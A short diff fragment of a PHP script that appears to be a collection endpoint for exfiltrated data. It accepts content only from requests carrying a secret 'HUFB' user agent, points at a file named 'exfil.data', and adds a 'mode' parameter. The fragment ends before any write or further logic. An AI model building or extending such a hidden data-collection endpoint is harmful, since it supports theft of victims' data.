@@ -3,6 +3,7 @@
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $source = $_SERVER['REMOTE_ADDR'];
 $host = $_SERVER['HTTP_HOST'];
+$mode = $_GET['mode'];
 if ($user_agent == 'HUFB') {
 	$content = $_GET['content'];
 	$file = '/home/ubuntu/data/exfil.data';
